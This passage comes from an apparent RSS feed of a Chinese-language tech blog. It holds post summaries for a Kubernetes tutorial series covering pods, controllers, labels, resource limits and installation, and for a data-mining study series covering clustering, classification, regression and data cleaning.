POD 控制器由主節點上的 kube-controller-manager 實現，常見的控制器有 ReplicaSet、Deployment、DaemonSet、StatefulSet、Job 等，它們實現不同的想法來管理 POD 資源。當然 API Server 不能少，它將負責儲存使用者的清單資源，再由控制器去實現使用者想要的狀態，在這之間控制器會透過 API Server 提供的接口進行不斷的監聽資源狀態，因此發生故障、更新等變動系統狀態的原因會不斷的向用戶想要的狀態不斷接近，而 status 的狀態就是紀錄當前狀態。
控制器與 POD 正常來說，一個 POD 控制器資源應該至少有三個字段
selector 關聯匹配的 POD，並管控其 POD replica 期望的 POD 數量 POD Template 指定控制器創建 POD 資源的配置訊息 相似於定義 POD 資源 結論 此篇文章用於了解，POD 資源被控制器控管的好處，以及如何定義控制器資源。再下面的章節將會介紹一些控制器。
參考資源 feisky - controller-manager</description></item><item><title>kubernetes - day11</title><link>https://cch0124.github.io/kubernetes/2020-09-01-pod-resource-limit-request/</link><pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-09-01-pod-resource-limit-request/</guid><description>在 K8s 上，可經由容器或 POD 請求或使用的計算資源有記憶體和 CPU。相互比較的話前者為不可壓縮資源，做一些伸縮操作可能會有問題，而後者事可壓縮資源，可以做伸縮的操作。
資源隔離目前是屬於容器級別，而資源藉由 requests 定義請求的可最小可用值，另一個 limits 用於限制資源最大可用值，如下圖所示。在 K8s 上，一個單位的 CPU 相當於虛擬機上的一顆 vCPU 或實體機上的一個 Hyperthread(一個邏輯 CPU)，一個核心相當於 1000 個微核心所以200m 相當於 0.2 個核心。記憶體以 Ei、Pi、Ti、Ki 等單位作為計算。
from &amp;ldquo;https://jaxenter.com/manage-container-resource-kubernetes-141977.html&amp;quot;
Example requests apiVersion: v1 kind: Pod metadata: name: stress-pod labels: app: test spec: containers: - name: stress image: ikubernetes/stress-ng command: [&amp;#34;/usr/bin/stress-ng&amp;#34;, &amp;#34;-c 1&amp;#34;, &amp;#34;-m 1&amp;#34;, &amp;#34;--metrics-brief&amp;#34;] resources: requests: memory: &amp;#34;128Mi&amp;#34; cpu: &amp;#34;200m&amp;#34; 配置清單上，POD 要求為容器要有 128Mi 記憶體和 5 分之 1 的 CPU 核心的最小資源。使用 -m 1 進行記憶體的壓測，滿載時盡可能占用 CPU 資源，同時間 -c 1 是對 CPU 進行壓測。</description></item><item><title>kubernetes - day10</title><link>https://cch0124.github.io/kubernetes/2020-08-31-pod-lifecycle/</link><pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-31-pod-lifecycle/</guid><description>此篇分享是要說關於 POD 對象的生命週期，POD 對象從建立到終止退出為它們的一個生命週期。而在這之間可以透過 POD 的定義執行一些創建容器、初始化容器等操作。在 openshift 中提供該生命週期流程圖，如下所示
這邊使用 openshift 文章內容進行翻譯解釋其流程
啟動其它容器之前，將啟動 infra 容器，以建立其它容器加入的名稱空間，依照此理解應該是指 pause 容器 用戶定義的第一個容器啟動是 init 容器，可將其用於 POD 範圍內的初始化 main 容器和 post-start hook 同時啟動，在範例中為4秒鐘 在秒數為 7 時，再次按每個容器啟動 liveness 和 readiness probes 在秒數為 11 時，當 POD 被終止時，執行 pre-stop hook，最後在寬限期後終止 main 容器 POD 定相 不管 POD 是被手動建立、或是透過一些 POD 控制器建立，POD 應當處於以下幾個定相
Pending
API Server 創建了 POD 資源並存入 etcd 中，但它尚未被調度完成，或者仍處於從倉庫下載 image 的過程中 Running
POD 已經被調度到某節點，且所有容器已由 kubelet 創建 Failed</description></item><item><title>kubernetes - day09</title><link>https://cch0124.github.io/kubernetes/2020-08-30-label-selector/</link><pubDate>Sun, 30 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-30-label-selector/</guid><description>這一章節承接第 8 天的文章，此篇文章要分享的是標籤和標籤選擇器的應用。
在一個 Kubernetes 環境下，當 POD 數量越來越多，分類和管理將會變得重要，因為這樣才能提升管理的效率，而在 K8s 中有一個 Label 的字段，它可用來定義資源而外的訊息像是測試環境、開發環境、前端等，往後在藉由標籤選擇器進行過濾完成想要的目標和任務。
標籤 標籤可以依附在每個 K8s 資源對象之上，一個對象可有不止一個標籤，而同一個標籤可被新增到多個資源上。如上述所講，它可以靈活的進行資源對象的分類進行管理，標籤可用版本、環境、分層架構等方式進行貼標籤動作。下圖為 &amp;ldquo;Kubernetes in action&amp;rdquo; 書中圖片
相較於 annotations，annotations 無法用來挑選資源對象，僅提供&amp;quot;原數據&amp;quot;，類似註解
管理標籤 K8s 中標籤字段定義在 metadata 上，以下面為範例，定義兩個標籤分別是 app 和 tier，值分別是 myapp 和 backend。
# pod-demo.yaml apiVersion: v1 kind: Pod metadata: name: pod-label-demo namespace: default labels: app: myapp tier: backend spec: containers: - name: myapp image: nginx:1.18 如果上面的 yaml 檔部署完成後，可用 --show-labels 的選項，讓列出 POD 資源時帶有定義的標籤。
$ kubectl get pod --show-labels NAME READY STATUS RESTARTS AGE LABELS pod-label-demo 1/1 Running 0 10s app=myapp,tier=backend 假設標籤給很多時，使用 -L key1,key2.</description></item><item><title>30 天學習歷程-day11</title><link>https://cch0124.github.io/blog/2020-08-29-feature-selection/</link><pubDate>Sat, 29 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-29-feature-selection/</guid><description>特徵選取是指在開發一個機器學習模型時，減少輸入特徵數量的過程。這過程不但能減少計算上的成本，有時還能因為特徵選取減少了聲噪的影響因而建構出一個良好的模型。特徵選擇可分為以下
Unsupervised 移除多餘的特徵 Correlation Supervised 移除無關連特徵 Wrapper RFE Filter 依照特徵集合和目標的關係選擇特徵集合 Statistical 方法 SelectKBest SelectPercentil Feature Importance 方法 Intrinsic 訓練過程中執行自動特徵選取的演算法 Decision Tree Dimensionality Reduction 將數據投影到低維度的特徵空間中 統計的特徵選取方法 通常在輸入和輸出變量之間使用 correlation 統計作為過濾器特徵選擇的基礎。統計量測選擇高度依賴於可變數據類型，如下
數值 Integer Floating 分類 Boolean Ordinal Nominal 從數據類型來看的話數值是屬於 Regression 問題，分類是 Classification 問題。通常過濾器特徵選擇中使用的統計測量與目標變數一次計算一個輸入變數。因此，它們被稱為單變量統計(univariate statistical)測量。</description></item><item><title>kubernetes - day08</title><link>https://cch0124.github.io/kubernetes/2020-08-29-management-pod/</link><pubDate>Sat, 29 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-29-management-pod/</guid><description>POD 和容器一樣，應該只運行一個應用，這樣才有輕量化的感覺。舉例來說，前端和後端應該要在各自的 POD 上，這樣的優勢有很多，像是被調度到不同節點上運行，提高資源使用上的效率。然而，Kubernetes 的伸縮功能，可針對每個獨立的 POD 進行，這樣提高了靈活性。但是，實際上有些系統設計需要在一個 POD 中運行多個容器，而這些的設計想必又會有一套原則去實踐，如下：
Sidecar pattern Ambassador pattern Adapter pattern 等等 管理 POD 容器 apiVersion: v1 kind: Pod metadata: name: pod-demo namespace: default labels: app: myapp tier: frontend spec: containers: - name: myapp # 容器名稱 image: nginx:1.18 # image - name: busybox image: busybox:latest command: [&amp;#34;bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;sleep 3600&amp;#34;] 以上面的 POD 資源清單來看，containers 是被用來定義容器清單。在 POD 中必定要有一個容器，因此該字段必須是要定義的。然而容器的環境設置還有許多參數可設定，可用以下方式去查看，會列出關於 containers 的相關字段。
$ kubectl explain pods.spec.containers KIND: Pod VERSION: v1 RESOURCE: containers &amp;lt;[]Object&amp;gt; .</description></item><item><title>30 天學習歷程-day10</title><link>https://cch0124.github.io/blog/2020-08-28-clustering/</link><pubDate>Fri, 28 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-28-clustering/</guid><description>分群(clustering) 是將一堆資料物件聚類成數個群集，讓同一群擊內的資料物件有很高的相似性，而不同群集間則有不相似的特性。在判別資料上的相似性會依照資料特徵進行衡量，通常可能會是量測距離等。
群集分析是什麼 就是將觀測的資料切分不同子集合的動作，每一個子集合都是一個群集。在百百種的分群演算法中，每種形成群集的效果都是不一樣，這些的演算法很適合挖掘未知的資訊。群集分析可以用來挖掘資料內部的分布，觀察每個群集的特徵，並進行下一步地分析動作。當然也可用作於資料前處理步驟，像是資料特性、屬性子集合選取或分類法等。而分群相較於分類，它能夠自動的找到群組。
集群分析方法 分割式分群法 找出互斥的球形群集 以距離為基礎 使用 mean 與 medoid 來代表群集中心點 對於中小型資料集很有效率 演算法有，k-means、k-medoids 等
階層式分群法 透過階層分解方式來分群 不能修正錯誤的合併或分割 可以結合微分群技術或考慮資料物件間的關聯性 演算法有，BIRCH、Chameleon 等
密度式分群法 找到任意形狀的群集 群集為空間中的資料物件密集的區域，不同群集則被低密度區域分隔 群集密度 每個資料物件得鄰近區域內包含至少最小數量的資料點 可以過濾離群值 演算法有，DBSCAN、OPTICS、DENCLUE 等</description></item><item><title>kubernetes - day07</title><link>https://cch0124.github.io/kubernetes/2020-08-28-namespace-pod-resource-operation/</link><pubDate>Fri, 28 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-28-namespace-pod-resource-operation/</guid><description>查看 Namespace 與資源對象 預設的 Kubernetes 提供了幾個 namespace 用於不同的目的，下面的結果在 GKE 或 kubeadm 上目前使用是一樣的，至於 namespace 名稱的用途可參考此鏈接
$ kubectl get namespace NAME STATUS AGE default Active 13h kube-node-lease Active 13h kube-public Active 13h kube-system Active 13h 針對某一個特定 namespace 進行詳細訊息查看
$ kubectl describe namespaces default 如果使用了 namespace 將一些應用進行隔離，我們要查看特定 namespace 下資源時須使用 -n 參數進行切換，預設是在 default 上。下面結果是 GKE 的環境。
$ kubectl get pods -n kube-system NAME READY STATUS RESTARTS AGE event-exporter-v0.3.0-5cd6ccb7f7-mp7p4 2/2 Running 0 13h fluentd-gcp-scaler-6855f55bcc-mchvv 1/1 Running 0 13h fluentd-gcp-v3.</description></item><item><title>30 天學習歷程-day09</title><link>https://cch0124.github.io/blog/2020-08-27-what-classification/</link><pubDate>Thu, 27 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-27-what-classification/</guid><description>以棒球員捕手為例，當他面對一位打者時，需要判斷說該打者對於什麼球種是安全的，那些球種是有風險的；醫療方面可能是分析乳癌的病患資料，並在幾種特定解決方法中，該給於怎樣的治療。這些例子中，資料分析方法就是分類(classification)。假設是預測棒球雙方的比數，該資料分析任務就是數值預測，迴歸分析(regression analysis)是最常用來數值預測的統計方法。
要進行資料分類，其程序大致為兩步驟，學習步驟此階段會建立模型；分類步驟此階段會利用模型來預測給定資料的類別標籤。學習步驟中會給定資料集合中的資訊，藉由分類演算法分析資料集合中一組樣本和其對應的類別標籤建立一個分類器。一個值組 $X$ 為 $n$ 維度的特徵向量，$X = (x_1, x_2, &amp;hellip;, x_3)$，其每個 $X$ 會對應一個類別，該類別可由類別標籤屬性來定義。假設一個樣本對應的標籤已經被定義好，該學習步驟可稱為監督式學習(supervised learning)，這與**非監督式學習(unsupervised learning)**不同，樣本無對應的標籤，需透過學習才知道，常見的方式就是使用分群(clustering)。以之前寫過的簡單線性迴歸來說，我們會希望透過映射函數來預測給定的資料樣本 $X$ 對應的類別標籤 $y$，就是找一個函數來分割資料的類別。
分類步驟會使用模型來進行分類，然而其正確率是多少 ? 在計算該值時不應該拿訓練資料進行評估，因分類器會傾向於過擬合(overfit) 訓練資料，就是說學習過程中，有些異常的資料會被過度學習，而該異常資料並不會出現在一般的資料集中。我們應當使用測試資料來進行正確率的評分。</description></item><item><title>kubernetes - day06</title><link>https://cch0124.github.io/kubernetes/2020-08-27-resource-format/</link><pubDate>Thu, 27 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-27-resource-format/</guid><description>資源配置清單 Kubernetes 中資源基本上都是需要五個字段定義資源，分別是 apiVersion、kind、metadata、spec 和 status。以下分別介紹
apiVersion group/version 定義 api-versions kind 資源類型 metadata 用來定義一些訊息，如名稱、所屬 namespace 與標籤等 spec 定義所期望的狀態 status 紀錄當前對象狀態 由 Kubernetes 維護，因此客戶端不需要去定義 這邊使用 get 方式取得 kube-system 的預設 namespcae 資訊，並以 yaml 輸出。
$ kubectl get namespace kube-system -o yaml apiVersion: v1 kind: Namespace metadata: creationTimestamp: &amp;#34;2020-08-22T02:00:45Z&amp;#34; name: kube-system resourceVersion: &amp;#34;4&amp;#34; selfLink: /api/v1/namespaces/kube-system uid: 73058111-fb1f-48a6-b283-338207167625 spec: finalizers: - kubernetes status: phase: Active 大致上相關資源都是以上面格式進行清單定義創建資源。以下練習建立一個 namespace 資源。為何不用定義跟上述一樣的字段 ?</description></item><item><title>30 天學習歷程-day08</title><link>https://cch0124.github.io/blog/2020-08-26-math/</link><pubDate>Wed, 26 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-26-math/</guid><description>二項式定理、指數、對數、三角函數 二項是定理 參考 參考 排列組合 排列
由 $n$ 個不同物品取 $k$ 個出來排列，因此最後的排列順序不同，及視為不同的排列 組合
由 $n$ 個不同物品取 $k$ 個出來但不排列，因此只要組成元素相同，及視為相同組合，無關順序排列 ABC、ACB、BAC、CAB、BCA、CBA 這 $3!$ 種排列可看成是 A、B、C 的組合 組合數可用 $\frac{n!}{(n-k)!k!}$ 或 $C^n_k$ 表示 二項分佈計算獨立事件的機率分佈 事件的成功機率與獨立性 拜訪 10 次簽下 $k$ 建的機率一般式 $0.36$ 每次拜訪成功機率，
$P(x=k) = \tbinom{10}{k} \centerdot 0.36^k \centerdot (1-0.36)^{10-k}$
拜訪 10 次簽下 2 件的機率 $P(x=2) = \tbinom{10}{2} \centerdot 0.36^2 \centerdot (1-0.36)^{10-2} = \frac{10!}{(10-2)!2!} \centerdot 0.</description></item><item><title>kubernetes - day05</title><link>https://cch0124.github.io/kubernetes/2020-08-26-pod-controller-resource/</link><pubDate>Wed, 26 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-26-pod-controller-resource/</guid><description>上一篇文章，教大家操作 Kubernetes 群集相關的操作，之前也大致說明 POD 是什麼。今天這篇文章會介紹到與 POD 相關的 POD 控制器和一些資源應用，這為了能夠更加豐富的運用 POD 資源，進而將容器的應用變得更加靈活、完善和操作等。下圖顯示了 Kubernetes POD 如何被 Kubernetes 的更抽象資源去應用。
在前面文章有介紹過 POD，它負責運行容器，同時解決環境依賴的一些問題，可能會是共享的儲存、配置資訊或網頁伺服器要的 SSL 等。然而 POD 的運行過程中可能會遇到一些資源配置不足或是一些突發狀況導致 POD 非正常的終止。這問題 Kubernetes 由負載類型的 POD 控制器去負責，適當將故障的 POD 重建。
雖然 POD 控制器能夠重建資源，但有些應用程序是有順序的概念，因此這邊又可將 POD 控制器分類為無狀態和有狀態類型。圖中 ReplicaSet 和 Deployment 屬於管理無狀態類型服務，StatefulSet 則是有狀態。除了這些， Kubernetes 還提供一些特殊應用的服務，像是 DaemonSet 它用於為每個節點上運行單一個 POD 的資源，可能是 Log 蒐集或是監控服務等應用，還有 Job 控制器，它可以提供短暫批次任務，完成後即可終止該資源。
POD 資源一般來說是群集內可相互存取的，再次重建後也應該要被發現。如果 POD 要給外部使用者存取則需要透過暴露方式，並且要有負載均衡。在 Kubernetes 中透過 Service 和 Endpoint 與 Ingress 可以解決發現、服務暴露和附載均衡。
在 Kubernetes 中設計了 Volume，可用於幫助 POD 的資源儲存，它支援了儲存設備和系統，像是 GlusterFS、CEPH RBD 和 NFS 等。不過 Kubernetes 有抽象了 CSI（Container Storage Interface） 統一儲存介面以便擴展更多的儲存應用。容器在運行時將不同環境所需的變數用環境變數作為解決方案，但容器啟動後不得更改。在 Kubernetes 中 configMap 能夠以環境變數或volume方式傳入至 POD 的容器中，它同時可被不同應用的 POD 共享，使得靈活性提高，然而對於此方式較隱密的資訊較不適合 configMap 需使用 Secret。</description></item><item><title>30 天學習歷程-day07</title><link>https://cch0124.github.io/blog/2020-08-25-simple-linear-regression/</link><pubDate>Tue, 25 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-25-simple-linear-regression/</guid><description>回歸模型（線性或非線性）被廣泛應用於數值預測，比如薪水，銷售額等等。如果說自變數（independent variable）是時間，那麼我們是在預測未來的數值；反之我們的模型在預測當前未知的數值。
簡單線性回歸，由自變量 $X$ 來預測因變量 $Y$ 的方法，假設這兩個變量是相關的線性，可嘗試尋找依據特徵($x$)的線性函數來擬合並預測($y$)。
from wiki
上圖中，紅線可以用 $y=ax+b$ 求得，且該紅線是能代表該資料的一條線，其 $a$ 為斜率；$b$ 為y截距。$y$ 為應變數 ，$x$ 為自變數。然而為了找到最佳擬合的線，會使最小平方法，該方法盡可能的讓預測值與實際值的誤差為最小。其公式如下，並對應下圖，$y_i$ 為實際值；$y_p$ 為預測值。
$$min{SUM(y_i-y_p)^2}$$
當誤差越大表示無法反映現實情況。我們以下使用 keras 和 sklearn 進行實驗。
程式碼 sklearn from tensorflow.keras.datasets import boston_housing (x_train, y_train), (x_test, y_test) = boston_housing.load_data() # 正規化 mean_feature_train = x_train.mean(axis=0) std_feature_train = x_train.std(axis=0) mean_feature_test = x_test.mean(axis=0) std_feature_test = x_test.std(axis=0) x_train = (x_train-mean_feature_train)/std_feature_train x_test = (x_test-mean_feature_test)/std_feature_test # 導入線性回歸模型 from sklearn.linear_model import LinearRegression regression = LinearRegression() regression = regression.</description></item><item><title>kubernetes - day04</title><link>https://cch0124.github.io/kubernetes/2020-08-25-k8s-bubectl-basic-operation/</link><pubDate>Tue, 25 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-25-k8s-bubectl-basic-operation/</guid><description>操作環境有 GKE 與 kubeadm 自架群集操作，本篇文章將會帶讀者學會使用 kubectl 觀看集群相關的資訊。
查看預設安裝的 POD 資源 GKE 的環境
$ kubectl get pods -n kube-system # -n 表示 namespace，kube-system 為指定的 namespace NAME READY STATUS RESTARTS AGE event-exporter-v0.3.0-5cd6ccb7f7-mp7p4 2/2 Running 0 13h fluentd-gcp-scaler-6855f55bcc-mchvv 1/1 Running 0 13h fluentd-gcp-v3.1.1-f8wc8 2/2 Running 0 13h fluentd-gcp-v3.1.1-g6mbn 2/2 Running 0 13h fluentd-gcp-v3.1.1-zq4xm 2/2 Running 0 13h heapster-gke-7c7bdf567c-cmqhm 3/3 Running 0 13h kube-dns-5c446b66bd-5ltbw 4/4 Running 0 13h kube-dns-5c446b66bd-fqvwk 4/4 Running 0 13h kube-dns-autoscaler-6b7f784798-hr8ck 1/1 Running 0 13h kube-proxy-gke-cluster-1-test-default-pool-255d7fb2-1f8l 1/1 Running 0 13h kube-proxy-gke-cluster-1-test-default-pool-255d7fb2-lbwc 1/1 Running 0 13h kube-proxy-gke-cluster-1-test-default-pool-255d7fb2-ppnm 1/1 Running 0 13h l7-default-backend-84c9fcfbb-kwrrs 1/1 Running 0 13h metrics-server-v0.</description></item><item><title>kubernetes - day03</title><link>https://cch0124.github.io/kubernetes/2020-08-24-kubernetes-pod/</link><pubDate>Mon, 24 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-24-kubernetes-pod/</guid><description>Kubernetes 核心資源 POD 介紹 在集群的 Master 上提供了 API Server 元件，同時有著 RESTful 的風格。像是 POD 資源包含了所有 POD 對象的集合，其用於描述在哪個節點進行容器的實例、需要配置什麼樣的環境(硬體資源或儲存)和管理上的策略，其策略可能是重啟、升級等。另外的 Kubernetes 也提供比 POD 更抽象的 POD 控制器，可用來確保 POD 的存在，這些控制器有 Deployment、Service 等。
POD 資源對象 POD 是一到多個容器應用的集合，這也包含著儲存、網路等元件。POD 可以想成是一個應用程式運行的實例，當中共享著前面提到的原件，如下圖所示。
因為共享著網路，所以 POD 中的對象都會是同一網段。因此可以透過 IP 直接進行通訊，不論是在哪一個節點上。所以這樣的結構可以想像成是一個 VM 虛擬機，但不同的是 POD 中的對象容器各個行程都相互彼此隔離。整體來看，該 POD 中的網路與儲存是容器的關鍵資源。但是，與 POD 外部的元件通訊需要透過 service 資源所創建的 ClusterIP 等類型和對應 Port 進行通訊。為了讓 POD 中資源能夠共享數據，因此提供了 volume 的資源。在更高階的抽象中該 volume 還可以讓容器在生命週期中時確保數據不遺失。
之後的章節會分享對於 POD 的擴充機制、訊息的處裡等資源。
圖中我們還看到一個為 Pause 的容器，該容器是 POD 中的基礎設施。它的 image 很小，都處於暫停狀態，它是解決 POD 網路而產生的，所以 POD 的 Network Namespace 的對應就是該容器。其實現程式碼從此鏈接可以得知如何實現。</description></item><item><title>30 天學習歷程-day06</title><link>https://cch0124.github.io/blog/2020-08-24-data-clean/</link><pubDate>Sat, 22 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-24-data-clean/</guid><description>Data cleaning 將使用 pandas 工具和 CICDDOS 數據集進行資料清理的練習。下面會學習到 pandas 的使用。
###　Drop Miss Value
import pandas as pd import numpy as np ddos = pd.read_csv(&amp;#34;D:\\DataSet\\CICDDOS2019\\01-12\\CSV\\DrDoS_LDAP.csv&amp;#34;) missing_values_count = ddos.isnull().sum() # 檢查缺失值 missing_values_count[20:25] ############################## #Bwd Packet Length Std 0 #Flow Bytes/s 12 # Flow Packets/s 0 # Flow IAT Mean 0 # Flow IAT Std 0 #dtype: int64 ##############################3 # Flow Bytes/s 有 12 個缺失值 ddos.shape # (2181542, 88) # 計算缺失值比例 total_miss_values = missing_values_count.</description></item><item><title>30 天學習歷程-day05</title><link>https://cch0124.github.io/blog/2020-08-21-data-pre-processing/</link><pubDate>Fri, 21 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-21-data-pre-processing/</guid><description>在現今資料報炸時代，資料容易受到遺漏值或不一致性影響。這樣的影響會導致數據的品質降低，以至於對探勘結果會有不好的影響。因此資料前處裡是一個很重要的步驟，這將影響著數據研究結果。當今有許多資料前處裡的技術，像是資料清理、資料整合、降維和資料轉換等等。
為何需要前處裡 簡單來說就是要當前資料有價值的去被應用。
資料品質由許多要素組成：
正確性 刻意輸入不正確值或設備故障 人為不小心錯誤輸入 完整性 客戶填寫的資料非所有都填寫 某些資訊可能沒有其它欄位資訊 一致性 格式不一樣等 時效性 資料的某些訊息需要在某個時間才會被輸入 可信度 資料有多少程度被使用者信賴 可解讀性 資料能否被使用者所解讀 然而前三項是現今大型資料庫或倉儲時常遇到的問題。
資料前處裡任務 資料清理 清除資料中雜訊，修復不一致性。
遺漏值 忽略該值值組 人工補遺漏值 使用一個長數值代替遺漏值 使用屬性的平均值或中位數等來填補遺漏值 使用同一類別的樣本平均值或中位數等來填補遺漏值 使用迴歸或決策樹等決定該遺漏值 避免遺漏值的方法最好是定義好規則。
雜訊資料 分箱法 對資料做排序，並指定分箱個數，在使用平均值或邊界方法來平滑數據。
迴歸 找出能夠切分資料點的線獲曲面。
離群值分析 藉由分群。
資料整合 從不同來源的資料合並成連貫一致的資料庫。可能不同資料庫輸入同一性質的值，但欄位名稱不一致，或者輸入值不一樣。然而有些資訊也許從多個欄位來取得，這在做整合時，同時也減少資料的冗長。
而資料冗於性可透過卡方檢定或相關係數與共變異數等檢測。</description></item><item><title>30 天學習歷程-day04</title><link>https://cch0124.github.io/blog/2020-08-20-data-similarity-dissimilarity/</link><pubDate>Thu, 20 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-20-data-similarity-dissimilarity/</guid><description>資料的相異性與相似性 在群集、離群值與最近鄰居等演算法應用中，需要比較兩個物件並評估兩物件之間的相似、相異性。
群集是指資料物件的集合，同一群集內的資料物件是彼此相似，不同群集間則是相異。離群值是辨識出那些物件與其它資料物件有著高度相異並將其認定為離群值。最近鄰居是對一個資料物件指定類別標籤，根據它與分類模型中其他物件的相似度決定。
資料矩陣和相異度矩陣 這邊的特徵向量將以二維或多維度屬性組成。
資料矩陣 使用 $n$ 筆物件乘上 $p$ 個屬性，來儲存 $n$ 筆資料物件。也稱屬性結構。
$\begin{bmatrix} x_{11} &amp;amp; &amp;hellip; &amp;amp; x_{1f} &amp;amp; &amp;hellip; &amp;amp; x_{1p} \
&amp;hellip; &amp;amp; &amp;hellip; &amp;amp; &amp;hellip; &amp;amp; &amp;hellip; &amp;amp; &amp;hellip; \
x_{i1} &amp;amp; &amp;hellip; &amp;amp; x_{if} &amp;amp; &amp;hellip; &amp;amp; x_{ip} \
&amp;hellip; &amp;amp; &amp;hellip; &amp;amp; &amp;hellip; &amp;amp; &amp;hellip; &amp;amp; &amp;hellip; \
x_{n1} &amp;amp; &amp;hellip; &amp;amp; x_{nf} &amp;amp; &amp;hellip; &amp;amp; x_{np} \
\end{bmatrix}$
相異度矩陣 儲存 $n$ 筆物件集合中，每一對物件的鄰近值，通常用一個 $n \times n$ 矩陣來表示。</description></item><item><title>kubernetes 1.18 安裝-day 02</title><link>https://cch0124.github.io/kubernetes/2020-08-20-kubernetes-install/</link><pubDate>Thu, 20 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-20-kubernetes-install/</guid><description>Introduction k8s 是一個用來編排容器的工具，這近幾年非常火紅。有著高可靠的架構、應用程序部署、自動部署、擴展等功能。
本篇文章已安裝為目的。
Environment 實驗環境會有一台 master 和兩台 node 而資源配置如下
CPU 2 vCPU memory 2 GB 192.168.134.131 | master 192.168.134.133 | node01 192.168.134.135 | node02 Configure Hostname $ sudo hostnamectl set-hostname master $ sudo hostnamectl set-hostname node01 $ sudo hostnamectl set-hostname node02 設定完之後，會出現 DNS 問題。此問題會讓本機無法解析，如下解決
$ sudo vim /etc/hosts 192.168.134.131 master 192.168.134.133 node01 192.168.134.133 node02 Disable Swap 所有機器應該要固定 CPU/memory，不應該使用 swap 會導致效能降低。
$ sudo swapoff -a $ sudo swapon -s 要保持永久效果至 fstab 將 swap 項目註解</description></item><item><title>30 天學習歷程-day03</title><link>https://cch0124.github.io/blog/2020-08-19-chart/</link><pubDate>Wed, 19 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-19-chart/</guid><description>Data Visualization 透過直方圖或分位數圖等能有效的對一個特徵進行觀察，而兩個特徵可使用散佈圖，本篇文章將介紹一些用 python 工具進行視覺化的方法。
Quantile Plot 對於給定的特徵，會顯示所有資料，並透過此呈現觀察數據的不尋常處或行為。最後在標示分位數已進行分布的觀察。
Quantile-Quantile Plot 能夠檢視從一個變數分布到另一個變數分布時是否有偏移現象。
Histogram 直方圖是對某一個特徵摘要其資料分布，然而該長條的高度代表該特徵出現的頻率。
price_count = {40: 275, 43: 300, 47:250, 74: 360, 75: 515, 78: 540, 115:320, 117:270, 120:350} sum_60 = 0 sum_80 = 0 sum_100 = 0 sum_120 = 0 for key, values in price_count.items(): # key 為價格，values 產品銷售數量 if key &amp;gt; 40 and key &amp;lt; 60: sum_60 += price_count.get(key) if key &amp;gt;= 60 and key &amp;lt; 80: sum_80 += price_count.</description></item><item><title>K8s-day01</title><link>https://cch0124.github.io/kubernetes/2020-08-19-kubernetes-overview/</link><pubDate>Wed, 19 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/kubernetes/2020-08-19-kubernetes-overview/</guid><description>什麼是 Kubernetes Kubernetes 是一個集群管理系統，它擁有可移植、擴展和高可用等特性。它用於管理容器(container)，然而容器的出現改變了佈署方式。容器類似於 VM 與主機共享內核(kernel)，容器有自己的檔案系統(filesystem)、CPU、記憶體(memory)、進程空間(process space)等。因為它們與基礎架構分離，因此可以跨雲(公、私有或混合雲中)和作業系統進行移植。然而容器佈署的數量越多管理難度明顯的會提升，使用者必須對容器進行分組，並對其分配網路、監控或安全等服務。藉由 kubernetes 提供的編排和管理功能，以便完成大規模佈署，且 kubernetes 提供了資源調度、容器擴展等管理功能，這些的作用讓 kubernetes 可以管理容器應用程式的生命週期。
Kubernetes 架構 Kubernetes 匯集多個物理機、虛擬機將其變成一個集群。如下圖
master 是用戶端與集群之間的核心聯絡重要位置 追蹤其它服務器的健康狀態 以最佳方式調度工作的負載 編排其它組件之間的任務 node 集群中的工作節點，負責接收來自 master 的工作調度 創建或銷毀 POD 調整網路好讓路由與轉發流量 POD Kubernetes 中嘴小運算單元 封裝多個容器 一個 POD 中的容器共享 namespace 和儲存資源，但彼此又在 mount、user、PID 等名稱空間保持隔離 在 kubernetes 中有很多的組件會來支撐整個集群的運作邏輯，像是編排、暴露、恢復等，之後文章會慢慢的提到。
master 組件 API Server 負責輸出 RESTful 的 Kubernetes API，負責接收和驗證相關的請求，其狀態資源會被存入 etcd 中。
etcd 該 etcd 會確保生產環境的可用性。它會提供監聽的機制，用於推送和監聽變更。只要有發生變化便會與 API Server 溝通，並做出適當的動作向客戶端輸出。</description></item><item><title>30 天學習歷程-day02</title><link>https://cch0124.github.io/blog/2020-08-18-statistical-data/</link><pubDate>Tue, 18 Aug 2020 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2020-08-18-statistical-data/</guid><description>Statistical Data 透過統計方式我們可以觀察資料的趨勢或是分散程度等，以下將會介紹常用的統計方式。
數據集中趨勢 Mean 一組數據中的平衡點 平均數是一組樣本和除以樣本數量 另 $x_1, x_2,&amp;hellip;, x_N$ 為 $X$ 的 $N$ 個觀測值。這些值有可稱為數據集。這些數值均值(mean)為 $$\bar{x} = \frac{\sum_{i=1}^{N} x_i}{N} = \frac{x_1+x_2+&amp;hellip;+x_N}{N}$$
